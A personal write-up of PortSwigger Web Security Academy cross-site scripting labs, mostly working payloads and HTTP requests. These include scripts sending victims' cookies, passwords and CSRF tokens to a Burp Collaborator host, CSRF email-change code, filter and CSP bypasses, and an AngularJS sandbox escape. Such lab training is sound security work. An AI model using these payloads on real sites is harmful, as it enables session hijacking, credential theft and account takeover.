# **xss burp labs**
https://portswigger.net/web-security/cross-site-scripting

# **Reflected XSS**
https://portswigger.net/web-security/cross-site-scripting/reflected

<span style="color:yellow;font-weight:700;font-size:30px">
Exploiting cross-site scripting vulnerabilities - 3 labs
</span>

https://portswigger.net/web-security/cross-site-scripting/exploiting


# ***1. Lab: Exploiting cross-site scripting to steal cookies***
https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies

This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim. 

1. find stored XSS:
```
POST /post/comment HTTP/1.1
Cookie: session=VaFtkIpmQsVgJNSJXR6SzOWjyJjPcOqH

csrf=tNfZzLkcKOAkjY2i4hkV3JajKwRfmVo8&postId=2&comment=<script>alert(1)</script>&name=<script>alert(2)</script>&email=1@drive.com&website=
```
**response:** 

alert 1 poped - comment is vulnerable!

**burp colaborator**
```
hqb7iapxk2hjk1bcmv371ssm7dd81x.oastify.com
```

<!-- 2. craft XSS:
```
POST /post/comment HTTP/1.1
Cookie: session=VaFtkIpmQsVgJNSJXR6SzOWjyJjPcOqH

csrf=tNfZzLkcKOAkjY2i4hkV3JajKwRfmVo8&postId=3&comment=<script>fetch('http://c2f2u51swxtewwn7yqf2dn4hj8p5du.oastify.com/'+document.cookie)</script>&name=attacker&email=1@drive.com&website=
```

works on me but i dont get a anything from vic. lets try different mehtod to initiate the callback: -->

2. craft XSS:
```
POST /post/comment HTTP/1.1
Cookie: session=VaFtkIpmQsVgJNSJXR6SzOWjyJjPcOqH

csrf=tNfZzLkcKOAkjY2i4hkV3JajKwRfmVo8&postId=4&comment=<script>document.location='http://c2f2u51swxtewwn7yqf2dn4hj8p5du.oastify.com/'+document.cookie;</script>&name=attacker&email=1@drive.com&website=

```
**resonse in burp colaborator:**
```
GET /secret=vDuHiLHzGprgjsyF4NcJGT6adF2zrqfX;%20session=E2kwm5V1vFUkQq2vW89G2WimZ6N4UiGa HTTP/1.1
```

3. send a **GET / HTTP/1.1** to repeater and change the cookie value (session) with the extracted values (secret. session):

```
GET / HTTP/1.1
Cookie: secret=vDuHiLHzGprgjsyF4NcJGT6adF2zrqfX; session=E2kwm5V1vFUkQq2vW89G2WimZ6N4UiGa
```

# Lab solved


# ***2. Lab: Exploiting cross-site scripting to capture passwords***
https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords
 
 This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's username and password then use these credentials to log in to the victim's account. 

1. check for XSS:
```
POST /post/comment HTTP/1.1

csrf=2hUq6dqUHYhlhDjySjZDKNgC7pxsM6bL&postId=6&comment=<script>alert('comment')</script>&name=<name>&email=clean@token.com&website=
```

2. craft a payload - use website form to post a comment:
'''htm
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://collaborator.oastify.com',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
'''

response:
```
POST / HTTP/1.1

administrator:oa183my69g2j1n51m7xs
```

# Lab Solved


# ***3. Lab: Exploiting XSS to perform CSRF***
https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf

 This lab contains a stored XSS vulnerability in the blog comments function. To solve the lab, exploit the vulnerability to perform a CSRF attack and change the email address of someone who views the blog post comments.

You can log in to your own account using the following credentials: wiener:peter 

1. login to wiener account and do a email change process:
```
POST /my-account/change-email HTTP/1.1

email=wiener@normal-user.net&csrf=NuLVz3gIonlrTUSodUwybd6nDdponj5a
```

2. use website form to post a comment:

```htm
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=attacker@gnail.com')
};
</script>
```

# Lab solved


<span style="color:yellow;font-weight:700;font-size:30px">
Cross-site scripting contexts - 15 labs
</span>
https://portswigger.net/web-security/cross-site-scripting/contexts


# ***1. Lab: Reflected XSS into HTML context with nothing encoded***
https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded

search field:
```htm
<script>alert(1)</script>

```
# ***2. Lab: Stored XSS into HTML context with nothing encoded***
https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded

test 1 - <script>alert(document.cookie)</script>


# ***3. Lab: Reflected XSS into HTML context with most tags and attributes blocked***
https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked
1. try baseline xss:
```
GET /?search=<script>alert(1)</script> HTTP/1.1
response:
"Tag is not allowed"
```

2. check if tag not blocked using portswigger cheatsheet tag list via intruder:
```
GET /?search=???? HTTP/1.1
```
200 responses (= not blocked!)
```
GET /?search=<body> HTTP/1.1
```


3. check event for blockage (using portswigger cheatsheet event list via intruder:)
```
GET /?search=???? HTTP/1.1
```

200 responses (= not blocked!)
```
GET /?search=<body%20onresize=1> HTTP/1.1
```


4. craft an html page with an iframe containig the search payload. the iframe also contains a command (executed on load) to resize its width - causing the payload to be fired:
```htm
<iframe src="https://0ac8001d04a89eb9c0751d16007f0036.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>

```
# POP!


# ***4. Lab: Reflected XSS into HTML context with all tags blocked except custom ones***
https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked
1. try baseline xss:
```htm
<script>alert(1)</script>

```
tags blocked!

2. check if tag not blocked using portswigger cheatsheet tag list via intruder:
all known tags are bloced

3. check custom tags sing portswigger cheatsheet tag list via intruder:
all custom tags are not blocked

lets look for a payload from custom tags:
```htm
<xss id=x tabindex=1 onfocus=alert(1)></xss>
```

we will put it in a link to the search term and add hash call ("#") for the tag "x":
```htm
<script>
location = 'https://0a310080041f2ce7c0c165c1004c0044.web-security-academy.net/?search=<xss id=x tabindex=1 onfocus=alert(1)></xss>#x';
</script>
```

explanation:
**location =** // JS command elling browser to go to a 
**'https://0a310080041f2ce7c0c165c1004c0044.web-security-academy.net/?search=** // exploitable URL and inject
**<xss id=x tabindex=1 onfocus=alert(1)></xss>** // payload utilizing custom tag (to bypass waf)
**#x** // and fire it up with hash (correspondes with id=x and uses tabindex to autofocus the element)

**material**: 
https://portswigger.net/research/one-xss-cheatsheet-to-rule-them-all



# ***5. Lab: Reflected XSS with event handlers and href attributes blocked***
https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked

label your vector with the word "Click":
```htm
<a href="">Click me</a>
```
1. try baseline xss:
```htm
<script>alert(1)</script>
```
"Tag is not allowed" 400

2. check if tag not blocked using portswigger cheatsheet tag list via intruder:
```
GET /?search=???? HTTP/1.1
```
200 responses (= not blocked!):
```xml
GET /?search=<a> HTTP/1.1
GET /?search=<animate> HTTP/1.1
GET /?search=<image> HTTP/1.1
GET /?search=<svg> HTTP/1.1
GET /?search=<title> HTTP/1.1
```

3. try adoptaion of last payload with \<a> tag
```htm
<a id=x tabindex=1\000onfocus=alert(1)>Click me</a>
```
"Event is not allowed" 400

4. check event types for blockage (using portswigger cheatsheet event list via intruder):

all event in the cheetlist are blocked by waf


5. look for eventless payload - using find on the cheetsheet for animate we get:
```htm
<svg x=">" onload=alert(1)> 
```
(the "**>**" makes WAF thinks its the end of the tag so he doesnt block the onload event handler)


# POP!

original Polyglot XSS payload:
```htm
-->'"/></sCript><svG x=">" onload=(co\u006efirm)``>
```
*by @s0md3v from:
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#polyglot-xss*

portswiggers payload (requiers user interaction):
```
<svg><a><animate attributeName=href values=javascript:alert(2) /><text x=20 y=20>Click me</text></a>
```

**1. breakdown:**
```
    <svg>   // whitelisted tag 
        <a>     // whitelisted tag (?why need 2 tags?)
            <animate attributeName=href values=javascript:alert(1) />
            <text x=20 y=20>Click me</text>
    </a> -->
```

# ***6. Lab: Reflected XSS with some SVG markup allowed***
https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed

```htm
<svg x=">" onload=alert(1)> 
```

portswigger solution:
```
<svg><animatetransform%20onbegin=alert(1)>
```


# ***7. Lab: Reflected XSS into attribute with angle brackets HTML-encoded***
https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded
```htm
<script>alert(1)</script>

```
reflects twice on page:
1. inside a header:
```htm
<h1>0 search results for ''&gt;&lt;script&gt;alert(1)&lt;/script&gt;'o'</h1>
```
2. in the search bar:
```htm
<input type="text" placeholder="Search the blog..." name="search" value="<script>alert(1)</script>">
```
the \<h1> tag escape tries fails so going to \<input> tag and changing to event handler payload:
```h
" autofocus onfocus=alert(document.domain) x="
```
reflected as:
```htm
<input type="text" placeholder="Search the blog..." name="search" value="" 
autofocus="" onfocus="alert(document.domain)" x="">
```
# POP!

# ***8. Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded***
https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded


To solve this lab, submit a comment that calls the alert function when the comment author name is clicked. 

1 try:
```
POST /post/comment HTTP/1.1

csrf=zldcOMiQQXjD7RtgPjTfwZEypoHRh2KP&postId=4&comment=walla%3F&name=hacker&email=clean%40token.com&website=test.com
```

response:
```htm
<p><img src="/resources/images/avatarDefault.svg" class="avatar"><a id="author" href="website=test.com">hacker</a> | 03 July 2022</p>
```

change href attribute value from "website=test.com" to "javascript:alert()" and resend via repeater

now we get clickble link that preform XSS POC

# POP!

# ***9. Lab: Reflected XSS in canonical link tag***
https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag

1. for canonical manipultion lets try adding arbitary paramaeter to the URL:
```htm
?test
```
full path: 
```
https://0a4100be0430aa3bc0926f20007d0094.web-security-academy.net/?test
```

reflect:
```
<head>
..
    <link rel="canonical" href='https://0a4100be0430aa3bc0926f20007d0094.web-security-academy.net/?test'/>
..
</head>
```

2. lets change "?test" with payload:
```
?'accesskey='x'onclick='alert(1)
```

payload breakdown:
**?** // param
**'** //breaks out of href field - wired since in js it uses ". maybe php back server uses ' ?
**accesskey='x'** // define shortcut key "x"  
**onclick='alert(1)** // when accessed via "x" key preform this action 

*access key to be accessed by ALT+SHIF+"x" in firefox.(in chrome/IE/safari/Opera15+ its just ALT+"X")*


full path:
```
https://0acb007104d7d0f9c07124ee00810023.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)
```

reflection:
```python
<head>
..
<link rel="canonical" href="https://0acb007104d7d0f9c07124ee00810023.web-security-academy.net/?" accesskey="x" onclick="alert(1)">
```

<!-- no need for user interaction if we just use autofocus onfocus?
?'autofocus+onfocus%3dalert()

full path
https://0a4100be0430aa3bc0926f20007d0094.web-security-academy.net/?'autofocus+onfocus%3dalert()

?tabindex=1+id=x+onfocus%3dalert(3) -->


# ***10. Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped***
https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped

hint:
```htm
</script><img src=1 onerror=alert(document.domain)>
```
test - search for test and look for reflections:
```
GET /?search=test HTTP/1.1
```

reflection:
```
<script>
    var searchTerms = 'test';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

payload to escape the code:
```htm
</script><img src=1 onerror=alert(document.domain)>
```
reflection:
```htm
<script>
    var searchTerms = '\'</script><img src=1 onerror=alert(document.domain)>';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>

```
# POP!

# ***11. Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded***
https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded

hints:
```htm
'-alert(document.domain)-'
';alert(document.domain)//
```

test - search for test and look for reflections:
```
GET /?search=test HTTP/1.1
```

reflection:
```htm
<script>
    var searchTerms = 'test';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

trying prevoius payload:
```htm
'</script><img src=1 onerror=alert(document.domain)>
```
reflection:
```htm
<script>
    var searchTerms = ''&lt;/script&gt;&lt;img src=1 onerror=alert(document.domain)&gt;';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

payloads (since we already inside script) - both works:
```htm
';alert(document.domain)//
'-alert(document.domain)-'
```
reflections:
```htm
<script>
    var searchTerms = '';alert(document.domain)//';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
<script>
    var searchTerms = ''-alert(document.domain)-'';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

# POP!

# ***12. Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped***
https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped

test last payload:
```
GET /?search=';alert(document.domain)//  HTTP/1.1

```
reflection
```htm
<script>
    var searchTerms = '\';alert(document.domain)//';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

**'** is escaped

use double escape ' to breakout:
```
GET /?search=\';alert(document.domain)// HTTP/1.1
```
reflection:
```htm
<script>
    var searchTerms = '\\';alert(document.domain)//';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

payload:
```htm
\';alert(document.domain)//

```

# ***13. Lab: Reflected XSS in a JavaScript URL with some characters blocked***
https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked

hint:
```
onerror=alert;throw 1
```

test:
```
POST /post/comment HTTP/1.1

csrf=L51ljiFGeK4JW8fE59ZWWdebbnezsNCc&postId=3&comment=test&name=test&email=clean%40token.com&website=https:test.
```

reflection
```htm
<p>
<img src="/resources/images/avatarDefault.svg" class="avatar"><a id="author" href="http://test.">test</a> | 03 July 2022
</p>
```

check1:
```
https://'<script>alert()</script>
```

reflection:
```htm
<a id="author" href="https://&apos;&lt;script&gt;alert()&lt;/script&gt;">test</a>
```

check2:
```
https://"+onerror=alert;throw+1337
```
```htm
<a id="author" href="https://&quot; onerror=alert;throw 1337">test</a>
```


port solution:
```htm
'},x=x=>{throw/**/onerror=alert,1337},toString=x,window%2b'',{x:'
```
url:
```
https://0a1800cb03087020c0b574f400240037.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
```


# ***14. Lab: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped***
https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped

try:
```
http://alert')
```
reflection:
```
<a id="author" href="http://alert\')" onclick="var tracker={track(){}};tracker.track('http://alert\')');">

```
try:
```
http://alert\')

```
reflection:
```htm
<a id="author" href="http://alert\')" onclick="var tracker={track(){}};tracker.track('http://alert\\\');">
```
learned: \ and ' are escaped

try (aubstitues to '):
```
'%27\x27&#39;&apos;
```
reflect:
```htm
<a id="author" href="http://\'\'\\x27&#39;&apos;" onclick="var tracker={track(){}};tracker.track('http://\'\'\\x27&#39;&apos;');">
```
learned: hex escape (\x00) and octa escape(\00)) are useless here


try (HtmlEnc --> UrlEnc):
```
http://&apos;&#37;&#50;&#55;&#92;&#120;&#50;&#55;&amp;&#35;&#51;&#57;&#59;&amp;&#97;&#112;&#111;&#115;&#59;alert")
```
```
http://%26apos%3b%26%2337%3b%26%2350%3b%26%2355%3b%26%2392%3b%26%23120%3b%26%2350%3b%26%2355%3b%26amp%3b%26%2335%3b%26%2351%3b%26%2357%3b%26%2359%3b%26amp%3b%26%2397%3b%26%23112%3b%26%23111%3b%26%23115%3b%26%2359;alert")
```

reflect:
```
 <a id="author" href="http://&apos;&#37;&#50;&#55;&#92;&#120;&#50;&#55;&amp;&#35;&#51;&#57;&#59;&amp;&#97;&#112;&#111;&#115;&#59;alert&quot;)" onclick="var tracker={track(){}};tracker.track('http://&apos;&#37;&#50;&#55;&#92;&#120;&#50;&#55;&amp;&#35;&#51;&#57;&#59;&amp;&#97;&#112;&#111;&#115;&#59;alert&quot;)');">
```
browser do URL decode but not HTML decode

<!-- " http://alert "
' http://alert '
are they different? '/" ? -->

try:
```
http://alert")
```
reflect:
```
<a id="author" href="http://alert&quot;)" onclick="var tracker={track(){}};tracker.track('http://alert&quot;)');">
```

try:
```
"%22\x22&#34;&quot;
```
reflect:
```
<a id="author" href="http://&quot;&quot;\\x22&#34;&quot;tpalert&quot;)" onclick="var tracker={track(){}};tracker.track('http://&quot;&quot;\\x22&#34;&quot;tpalert&quot;)');">
```

try (aubstitues to '):
```
http://'%27%26#39;%26apos;alert()
```

try (urlencoded X1)
```
'%2527%26%2339%3b%26apos%3balert
```

reflect:
```
<a id="author" href="http://\'%27%26#39;%26apos;alert()" onclick="var tracker={track(){}};tracker.track('http://\'%27%26#39;%26apos;alert()');">
```

try (urlencode X2):
```
http%3a//'%2527%2526%2339%3b%2526apos%3balert()
```
full url:
```
<a id="author" href="http://\'%27%26#39;%26apos;alert()" onclick="var tracker={track(){}};tracker.track('http://\'%27%26#39;%26apos;alert()');">
```

try:
```
https://0a1c00a404fd51e9c1e76ff900ec007f.web-security-academy.net/%26#39;'--%0d%0a;alert(document.domain)//
```
ref:
```
https://0a1c00a404fd51e9c1e76ff900ec007f.web-security-academy.net/'/'--!%3E;alert(document.domain)//
```


post solutions:
http://foo?&apos;-alert(1)-&apos;

<!-- ?? do you send it as is or do you url encode the & ? TBC-->

# ***15. Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped***
https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped

> hint: ${alert(document.domain)}

try:
```
test`\
```
reflection in response:
```
<script>
    var message = `0 search results for 'test\u0060\u005c'`;
    document.getElementById('searchMessage').innerText = message;
</script>
```

payload:
```
${alert(document.domain)}
```


<span style="color:yellow;font-weight:700;font-size:30px">
Client-side template injection - labs
</span>

https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection

# ***1. Lab: Reflected XSS with AngularJS sandbox escape without strings***
https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-without-strings


This lab uses AngularJS in an unusual way where the $eval function is not available and you will be unable to use any strings in AngularJS.

To solve the lab, perform a cross-site scripting attack that escapes the sandbox and executes the alert function without using the $eval function. 


**Materials**:
1. fool the IsIdent() function:
```
'a'.constructor.prototype.charAt=[].join
```
2. execution code:
```
$eval('x=alert(1)')
```
3. bypassing eval() blacklisted:
```
[123]|orderBy:'Some string'
```
* The colon signifies an argument to send to the filter, which in this case is a string. The orderBy filter is normally used to sort an object, but it also accepts an expression, which means we can use it to pass a payload. 


1. observe a the Angular.js load at: 
request:
```
GET /resources/js/angular_1-4-4.js HTTP/1.1
``` 

find isident() function call (line 203-205)
```js
ec.prototype={
    constructor:ec,lex:function(a){
        this.text=a;
        this.index=0;
        for(this.tokens=[];
        this.index<this.text.length;
        )if(a=this.text.charAt(this.index),'"'===a||"'"===a)this.readString(a);
    else if(this.isNumber(a)||"."===a&&this.isNumber(this.peek()))this.readNumber();
    else if(this.isIdent(a))this.readIdent();
    else if(this.is(a,"(){}[].,;:?"))this.tokens.push({
        index:this.index,text:a
        }
    },
    isIdent:function(a){
        return"a"<=a&&"z">=a||"A"<=a&&"Z">=a||"_"===a||"$"===a
    },
    readIdent:function(){
    for(var a=this.index;this.index<this.text.length;){var c=this.text.charAt(this.index);if(!this.isIdent(c)&&!this.isNumber(c))break;this.index++

```
2. in search page we find the call to angularJS to handle search parameters:
request:
```
GET /?search=test HTTP/1.1
```
response:
```html
<script>angular.module('labApp', []).controller('vulnCtrl',function($scope, $parse) {
    $scope.query = {};
    var key = 'search';
    $scope.query[key] = 'test';
    $scope.value = $parse(key)($scope.query);
});</script>
```
3.Portswiggers solution:
```
https://YOUR-LAB-ID.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```

**Explanation:**

The exploit uses toString() to create a string without using quotes. It then gets the String prototype and overwrites the charAt function for every string. This effectively breaks the AngularJS sandbox. Next, an array is passed to the orderBy filter. We then set the argument for the filter by again using toString() to create a string and the String constructor property. Finally, we use the fromCharCode method generate our payload by converting character codes into the string x=alert(1). Because the charAt function has been overwritten, AngularJS will allow this code where normally it would not.

**final payload**:
```
1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```
# cool


<span style="color:yellow;font-weight:700;font-size:30px">
Dangling markup injection- labs
</span>
https://portswigger.net/web-security/cross-site-scripting/dangling-markup

materials:
```htm
"><img src='//attacker-website.com?
```
after **?** will come part of the response as parameter (until another **'** will appear and close the url address)


# ***2.Lab: Reflected XSS with AngularJS sandbox escape and CSP***
https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-and-csp

 This lab uses CSP and AngularJS.

To solve the lab, perform a cross-site scripting attack that bypasses CSP, escapes the AngularJS sandbox, and alerts document.cookie. 


**material:**
```htm
<input autofocus ng-focus="$event.path|orderBy:'[].constructor.from([1],alert)'">
```

hiding the window object from the AngularJS sandbox:
```
[1].map(alert)
```
 
(*from: https://portswigger.net/research/angularjs-csp-bypass-in-56-characters)
<input id=x ng-focus=$event.path|orderBy:'(y=alert)(1)'>

1. adjust payload:
<input id=x ng-focus=$event.path|orderBy:'(y=alert)(document.cookie)'>

2. paste payload with url in exploit server:
```htm
<script>
location='https://0a2b0029033422e6c0026c7000df00fc.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.path|orderBy:%27(y=alert)(document.cookie)%27%3E#x';
</script>
```
**explanation:**
 The exploit uses the ng-focus event in AngularJS to create a focus event that bypasses CSP. It also uses $event, which is an AngularJS variable that references the event object. The path property is specific to Chrome and contains an array of elements that triggered the event. The last element in the array contains the window object.

Normally, | is a bitwise or operation in JavaScript, but in AngularJS it indicates a filter operation, in this case the orderBy filter. The colon signifies an argument that is being sent to the filter. In the argument, instead of calling the alert function directly, we assign it to the variable z. The function will only be called when the orderBy operation reaches the window object in the $event.path array. This means it can be called in the scope of the window without an explicit reference to the window object, effectively bypassing AngularJS's window check. 

# Lab Solved



<span style="color:yellow;font-weight:700;font-size:30px">
Content security policy - labs
</span>
https://portswigger.net/web-security/cross-site-scripting/content-security-policy


# ***1.Lab: Reflected XSS protected by very strict CSP, with dangling markup attack***
https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack

 This lab using a strict CSP that blocks outgoing requests to external web sites.

To solve the lab, first perform a cross-site scripting attack that bypasses the CSP and exfiltrates a simulated victim user's CSRF token using Burp Collaborator. You then need to change the simulated user's email address to hacker@evil-user.net.

You must label your vector with the word "Click" in order to induce the simulated user to click it. For example:
```htm
<a href="">Click me</a>
```


"><a+href%3d"">Click+me</a><img+src='//ymorga8gbj20hj51yca67qm63x9oxel3.oastify.com?


<span style="color:yellow;font-weight:700;font-size:30px">
Content security policy - labs
</span>
https://portswigger.net/web-security/cross-site-scripting/content-security-policy

portswigger claims email is vulnerable to XSS - *TBC*


1. in exploit server:
```
<script>
if(window.name) {
	new 
        Image().src='//zorsibahdk41jk720dc79ro75ybpzjn8.oastify.com?'+encodeURIComponent(window.name);
	} else {
		location = 'https://0a25001f0395cd12c0812e9c00430009.web-security-academy.net/my-account/?email=%22%3E%3Ca%20href=%22https://exploit-0a95001a035acd10c00c2eee016000e0.exploit-server.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27';
}
</script>
```
2. in Collaborator we get HTTP traffic:
```
GET /?%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20required%20type%3D%22hidden%22%20name%3D%22csrf%22%20value%3D%22SjmBqlo3hac26AjUFbmHAtAbwDuiz0C9%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cbutton%20class%3D HTTP/1.1
Host: zorsibahdk41jk720dc79ro75ybpzjn8.oastify.com
```
after url decode:
```htm
">
    <input required type="hidden" name="csrf" value="SjmBqlo3hac26AjUFbmHAtAbwDuiz0C9">
    <button class=
```
we now have CSRF value

3. turn intercept *ON* and request an email change. send the request to POC generator and drop it. turn interception *OFF*

4. edit the following code. replacing *LabID* and the new obtained *csrf token* in the following code (generated originly by burp PoC Generator):

<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://0a25001f0395cd12c0812e9c00430009.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker&#64;bad&#45;user&#46;net" />
      <input type="hidden" name="csrf" value="SjmBqlo3hac26AjUFbmHAtAbwDuiz0C9" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>

# Lab Solved



# ***2. Lab: Reflected XSS protected by CSP, with CSP bypass***
https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-bypass

 This lab uses CSP and contains a reflected XSS vulnerability.

To solve the lab, perform a cross-site scripting attack that bypasses the CSP and calls the alert function.

Please note that the intended solution to this lab is only possible in Chrome.


Materials:
**Bypassing CSP with policy injection**
https://portswigger.net/research/bypassing-csp-with-policy-injection

Chrome CSP bypass using policy injection:

https://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=%3Bscript-src-elem+*&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E




1. find injection location:


```
GET /search=<img src=1 onerror=alert(1)>HTTP/1.1
```

response: img reflected but script didnt fire-up

2. observe CSP has a token value in the report-uri parameter. check if injection reflects:

```
GET /?token=test HTTP/1.1
```

response:
```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Security-Policy: default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=test
```
we can inject arbitary values to the CSP:

3. adjust CSP bypass:

search=<script>alert()</script>
token=;script-src-elem 'unsafe-inline'

**final payload:**
https://0a32002b034ca0a2c0db0e8600880038.web-security-academy.net/?search=%3Cscript%3Ealert%28%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27

# Lab solved

